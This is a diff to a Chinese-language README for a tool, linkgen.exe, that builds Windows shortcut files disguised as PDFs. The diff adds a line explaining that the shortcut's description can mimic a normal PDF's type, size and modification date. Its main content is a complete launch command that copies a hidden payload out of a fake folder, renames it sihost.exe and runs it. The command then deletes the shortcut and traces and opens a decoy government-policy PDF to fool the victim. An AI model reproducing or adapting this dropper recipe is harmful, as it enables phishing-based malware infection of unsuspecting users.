@@ -1,7 +1,9 @@
 
 ### 1.快捷方式生成
 参考 www.x86matthew.com 的项目，原文链接已删除。 
-2023年7月份改的代码，主要配合bat/vbs脚本调用，图标替换通过010editor进行修改，之前本想将其写成个 操作友好的工具，但由于部分原因没弄成
+2023年7月份改的代码，主要配合bat/vbs脚本调用，图标替换通过010editor进行修改，之前本想将其写成个 操作友好的工具，但由于部分原因没弄成.
+
+test处可伪装成正常打开pdf时显示的内容（类型、大小、修改日期）
 
 ```
 linkgen.exe calc.pdf.lnk "test" "xcopy /h /y %cd%__MACOSX.DOCX\calc.tmp %temp%\ & attrib -s -a -h %temp%\calc.tmp & rename %temp%\calc.tmp sihost.exe & attrib -s -a -h %cd%__MACOSX.DOCX\calc.tmp & start %temp%\sihost.exe & del "calc.pdf.lnk" & del /F /A /Q "%cd%__MACOSX.DOCX\wct366A.tmp" & copy "%cd%__MACOSX.DOCX\电子商务产业发展扶持奖励政策.pdf" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & start "" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & del "%cd%__MACOSX.DOCX\XXX电子商务产业发展扶持奖励政策.pdf" "
